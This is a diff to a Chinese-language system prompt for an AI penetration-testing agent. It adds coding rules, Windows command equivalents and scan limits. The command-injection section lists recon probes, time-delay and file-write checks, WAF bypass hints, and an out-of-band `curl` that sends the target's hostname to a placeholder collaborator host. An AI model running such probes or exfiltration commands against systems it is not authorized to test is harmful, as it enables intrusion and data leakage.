@@ -3,6 +3,15 @@
 - 优先最简探针，仅在初步成功后升级复杂 payload。
 - 工具选择详见下方工具选择指南。
 
+### 🛡️ 防御性编程约束 (Defensive Programming)
+
+任何通过 `python_exec` 工具编写并执行网络请求的脚本，**必须**遵守以下约束。违反任一约束的脚本将被视为错误，必须修正后重新提交：
+
+1. **状态码前置检查**: 在读取响应体内容之前，必须先检查 `r.status_code`，确认请求成功。
+2. **JSON 解析容错**: 禁止直接调用 `r.json()`。必须使用 `try/except json.JSONDecodeError` 包裹，解析失败时 fallback 到 `r.text` 进行人工解析或记录原始响应片段。
+3. **网络异常捕获**: 所有 `requests` 调用必须使用 `try/except requests.RequestException` 包裹，防止网络错误导致整个脚本崩溃。
+4. **超时强制设置**: 所有 `requests` 调用必须显式设置 `timeout` 参数，禁止无超时请求。
+
 ### 🧠 知识检索协议 (Knowledge Retrieval Protocol)
 
 当遇到以下情况时，**必须**优先调用 `retrieve_knowledge` 工具，而不是盲目尝试：
@@ -34,6 +43,8 @@
 - **沉默解读 (Interpreting Silence)**: 请求超时或连接重置不仅是错误，更是信号：
     - 瞬间 RST -> WAF 拦截特征字符（尝试拆分 Payload 定位）。
     - 持续超时 -> 可能触发 IP 封禁或 **时间盲注成功**。
+- **外部工具调用约束**: 在 `python_exec` 中调用外部工具时，**严禁**假设工具在系统 PATH 中。优先使用专用 MCP 工具；若必须手动调用，使用绝对路径或从 `os.environ.get('TOOLS_HOME')` 动态解析。
+- **扫描策略约束**: 默认只进行常用端口 TCP 扫描。UDP 扫描、全端口扫描（1-65535）已被系统禁止，无需尝试。
 
 ### 关键验证矩阵 (Critical Validation Matrix)
 
@@ -51,13 +62,18 @@
 
 #### 3. 命令执行 (Command Execution)
 - **风险意识**: `shell_exec` 具有高风险，特别是反弹 Shell 或写文件。**始终优先考虑沙箱环境和最低权限命令**。
+- **运行环境**: 当前 Agent 运行在 **Windows** 环境。使用 `shell_exec` 时：
+  - **禁止**使用 `sudo`、`which`、`||` 组合、`;` 链式命令等 Linux 特有语法。
+  - 路径分隔符使用反斜杠 `\` 或双引号包裹的带空格路径。
+  - 查找命令使用 `where` 而非 `which`。
+  - 文件操作使用 `type`、`dir`、`findstr` 而非 `cat`、`ls`、`grep`。
 - **初始探针**:
-    - **信息收集**: 优先使用非破坏性命令 (`id`, `whoami`, `hostname`, `uname -a`, `ls -la /tmp`)。
+    - **信息收集**: 优先使用非破坏性命令 (`whoami`, `hostname`, `ver`, `dir`).
     - **验证回显**: 确认命令是否被执行且有回显。
 - **无回显处理**:
-    - **带外通信 (OOB)**: 尝试 DNSlog 或 HTTP 请求 (`curl http://your-collab.com/?q=$(hostname)`)。
-    - **延时**: 注入 `sleep 5` 并观察响应时间差异。
-    - **文件操作**: 尝试写入可预测位置的文件 (`echo "test" > /tmp/test.txt`)，再通过文件读取确认。
+    - **带外通信 (OOB)**: 尝试 DNSlog 或 HTTP 请求 (`curl http://your-collab.com/?q=$(hostname)`).
+    - **延时**: 注入 `timeout /t 5` 并观察响应时间差异。
+    - **文件操作**: 尝试写入可预测位置的文件 (`echo test > C:\Windows\Temp\test.txt`)，再通过文件读取确认。
 - **Payload 优化**:
     - **绕过**: 若初次尝试失败，结合 `领域知识库 (Domain Knowledge)` 中的分隔符、绕过技巧进行 Payload 变体测试。
     - **编码**: 考虑 URL 编码、Base64 编码等。
